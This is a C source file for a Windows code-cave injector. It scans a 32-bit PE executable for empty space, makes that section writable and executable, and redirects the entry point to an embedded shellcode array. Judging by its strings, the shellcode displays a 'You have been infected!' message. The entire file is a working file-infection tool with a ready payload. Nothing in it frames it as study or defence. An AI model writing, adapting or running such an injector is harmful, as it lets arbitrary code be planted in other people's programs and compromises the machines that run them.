#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#define BASE_SHELL_SIZE   273
#define PREFIX_NOP_COUNT   4

static const unsigned char BaseShellcode[BASE_SHELL_SIZE] = {
    0xd9,0xeb,0x9b,0xd9,0x74,0x24,0xf4,0x31,0xd2,0xb2,0x77,0x31,0xc9,0x64,
    0x8b,0x71,0x30,0x8b,0x76,0x0c,0x8b,0x76,0x1c,0x8b,0x46,0x08,0x8b,0x7e,
    0x20,0x8b,0x36,0x38,0x4f,0x18,0x75,0xf3,0x59,0x01,0xd1,0xff,0xe1,0x60,
    0x8b,0x6c,0x24,0x24,0x8b,0x45,0x3c,0x8b,0x54,0x28,0x78,0x01,0xea,0x8b,
    0x4a,0x18,0x8b,0x5a,0x20,0x01,0xeb,0xe3,0x34,0x49,0x8b,0x34,0x8b,0x01,
    0xee,0x31,0xff,0x31,0xc0,0xfc,0xac,0x84,0xc0,0x74,0x07,0xc1,0xcf,0x0d,
    0x01,0xc7,0xeb,0xf4,0x3b,0x7c,0x24,0x28,0x75,0xe1,0x8b,0x5a,0x24,0x01,
    0xeb,0x66,0x8b,0x0c,0x4b,0x8b,0x5a,0x1c,0x01,0xeb,0x8b,0x04,0x8b,0x01,
    0xe8,0x89,0x44,0x24,0x1c,0x61,0xc3,0xb2,0x08,0x29,0xd4,0x89,0xe5,0x89,
    0xc2,0x68,0x8e,0x4e,0x0e,0xec,0x52,0xe8,0x9f,0xff,0xff,0xff,0x89,0x45,
    0x04,0xbb,0x7e,0xd8,0xe2,0x73,0x87,0x1c,0x24,0x52,0xe8,0x8e,0xff,0xff,
    0xff,0x89,0x45,0x08,0x68,0x6c,0x6c,0x20,0x41,0x68,0x33,0x32,0x2e,0x64,
    0x68,0x75,0x73,0x65,0x72,0x30,0xdb,0x88,0x5c,0x24,0x0a,0x89,0xe6,0x56,
    0xff,0x55,0x04,0x89,0xc2,0x50,0xbb,0xa8,0xa2,0x4d,0xbc,0x87,0x1c,0x24,
    0x52,0xe8,0x5f,0xff,0xff,0xff,0x68,0x74,0x58,0x20,0x20,0x68,0x41,0x6c,
    0x65,0x72,0x31,0xdb,0x88,0x5c,0x24,0x05,0x89,0xe3,0x68,0x65,0x64,0x21,
    0x58,0x68,0x66,0x65,0x63,0x74,0x68,0x6e,0x20,0x69,0x6e,0x68,0x20,0x62,
    0x65,0x65,0x68,0x68,0x61,0x76,0x65,0x68,0x59,0x6f,0x75,0x20,0x31,0xc9,
    0x88,0x4c,0x24,0x17,0x89,0xe1,0x31,0xd2,0x6a,0x10,0x53,0x51,0x52,0xff,
    0xd0,0x31,0xc0,0x50,0xff,0x55,0x08
};

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <path_to_PE>\n", argv[0]);
        return 1;
    }

    const char *filename = argv[1];
    FILE *f = NULL;
    unsigned char *buffer = NULL;
    size_t fileSize = 0;

    // 1. Read entire PE file into memory
    f = fopen(filename, "rb");
    if (!f) {
        fprintf(stderr, "Error: Unable to open file '%s' for reading.\n", filename);
        return 1;
    }
    fseek(f, 0, SEEK_END);
    fileSize = ftell(f);
    fseek(f, 0, SEEK_SET);

    buffer = (unsigned char *)malloc(fileSize);
    if (!buffer) {
        fclose(f);
        fprintf(stderr, "Error: Out of memory.\n");
        return 1;
    }
    if (fread(buffer, 1, fileSize, f) != fileSize) {
        fclose(f);
        free(buffer);
        fprintf(stderr, "Error: Could not read entire file.\n");
        return 1;
    }
    fclose(f);

    // 2. Parse DOS header
    if (fileSize < sizeof(IMAGE_DOS_HEADER)) {
        free(buffer);
        fprintf(stderr, "Error: File too small to be a valid PE.\n");
        return 1;
    }
    IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)buffer;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        free(buffer);
        fprintf(stderr, "Error: Not a valid DOS header.\n");
        return 1;
    }

    // 3. Parse NT headers (assume 32-bit PE)
    if (dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32) > fileSize) {
        free(buffer);
        fprintf(stderr, "Error: Invalid e_lfanew or truncated file.\n");
        return 1;
    }
    IMAGE_NT_HEADERS32 *ntHeaders = (IMAGE_NT_HEADERS32 *)(buffer + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        free(buffer);
        fprintf(stderr, "Error: Not a valid NT header.\n");
        return 1;
    }
    if (ntHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        free(buffer);
        fprintf(stderr, "Error: This injector only supports 32-bit PE files.\n");
        return 1;
    }

    // 4. Save original entrypoint RVA and image base
    DWORD origEntryRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
    DWORD imageBase    = ntHeaders->OptionalHeader.ImageBase;

    // 5. Compute the minimum code cave size: (4 nop + BASE_SHELL_SIZE) + 5 (jmp instruction)
    int minCave = PREFIX_NOP_COUNT + BASE_SHELL_SIZE + 5;

    // 6. Locate the first section header (immediately after OptionalHeader)
    IMAGE_SECTION_HEADER *section = (IMAGE_SECTION_HEADER *)(
        (LPBYTE)&ntHeaders->OptionalHeader + ntHeaders->FileHeader.SizeOfOptionalHeader
    );
    int numSections = ntHeaders->FileHeader.NumberOfSections;

    DWORD rawOffsetFound = 0;
    DWORD virtAddrFound  = 0;
    int   foundCave      = 0;

    // 7. Scan each section for a run of 0x00 bytes ≥ minCave
    for (int i = 0; i < numSections; i++) {
        DWORD sectionRawPtr  = section[i].PointerToRawData;
        DWORD sectionRawSize = section[i].SizeOfRawData;

        if (sectionRawSize == 0 || sectionRawPtr + sectionRawSize > fileSize) {
            continue;
        }

        int count = 0;
        for (DWORD off = 0; off < sectionRawSize; off++) {
            if (buffer[sectionRawPtr + off] == 0x00) {
                count++;
            } else {
                if (count >= minCave) {
                    rawOffsetFound = sectionRawPtr + off - count;
                    virtAddrFound  = imageBase
                                    + section[i].VirtualAddress
                                    + (off - count);
                    // Patch section characteristics to R/W/X | CNT_CODE
                    section[i].Characteristics = 0xE0000020
                                               | 0x20000000
                                               | 0x40000000
                                               | 0x80000000;
                    foundCave = 1;
                    break;
                }
                count = 0;
            }
        }
        if (foundCave) break;
    }

    if (!foundCave) {
        free(buffer);
        fprintf(stderr, "Error: No code cave ≥ %d bytes was found.\n", minCave);
        return 1;
    }

    // 8. Compute new EntryPoint RVA
    DWORD newEntryRVA = virtAddrFound - imageBase;
    ntHeaders->OptionalHeader.AddressOfEntryPoint = newEntryRVA;

    // 9. Compute original entrypoint VA
    DWORD origEntryVA = origEntryRVA + imageBase;

    // 10. Build final shellcode blob:
    //     [4 NOPs] + [BaseShellcode] + [jmp rel32 -> origEntry]
    unsigned char finalShell[PREFIX_NOP_COUNT + BASE_SHELL_SIZE + 5];
    size_t idx = 0;

    // 10.1 Prefix 4 NOPs
    for (int i = 0; i < PREFIX_NOP_COUNT; i++) {
        finalShell[idx++] = 0x90;
    }

    // 10.2 Copy BaseShellcode
    for (int i = 0; i < BASE_SHELL_SIZE; i++) {
        finalShell[idx++] = BaseShellcode[i];
    }

    // 10.3 Append JMP to original entrypoint
    //      opcode E9 <rel32>
    DWORD jmpFromVA = virtAddrFound + (DWORD)idx;
    DWORD rel32 = origEntryVA - (jmpFromVA + 5);
    finalShell[idx++] = 0xE9;
    *(uint32_t *)(finalShell + idx) = rel32;
    idx += 4;

    size_t finalShellSize = idx;

    // 11. Inject finalShell into the code cave
    if ((size_t)rawOffsetFound + finalShellSize > fileSize) {
        free(buffer);
        fprintf(stderr, "Error: Shellcode does not fit at offset 0x%08X.\n", rawOffsetFound);
        return 1;
    }
    memcpy(buffer + rawOffsetFound, finalShell, finalShellSize);

    // 12. Write modified PE back to disk
    f = fopen(filename, "r+b");
    if (!f) {
        free(buffer);
        fprintf(stderr, "Error: Unable to reopen '%s' for writing.\n", filename);
        return 1;
    }
    if (fwrite(buffer, 1, fileSize, f) != fileSize) {
        fclose(f);
        free(buffer);
        fprintf(stderr, "Error: Could not write changes to '%s'.\n", filename);
        return 1;
    }
    fclose(f);
    free(buffer);

    printf("Injection complete!\n");
    printf("  New EntryPoint RVA = 0x%08X\n", newEntryRVA);
    printf("  Shellcode size     = %zu bytes\n", finalShellSize);
    printf("  Injected at raw off= 0x%08X\n", rawOffsetFound);
    return 0;
}
